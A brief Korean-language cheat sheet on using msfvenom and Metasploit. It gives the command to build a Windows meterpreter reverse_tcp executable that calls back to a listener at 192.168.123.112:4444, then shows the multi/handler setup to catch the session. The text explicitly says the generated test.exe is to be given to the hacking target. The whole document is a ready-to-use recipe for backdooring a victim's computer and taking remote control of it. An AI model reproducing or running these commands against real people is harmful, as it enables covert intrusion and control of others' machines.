## msfvenom 사용법
```
root로 로그인 후,
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe lhost=192.168.123.112 lport=4444 -o /root/test.exe

그럼 /root/에 test.exe 파일이 생성됨. (test.exe 파일을 해킹 대상자에게 주어야함)

msfconsle
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.123.112
set LPORT 4444

exploit -j
```
- - -
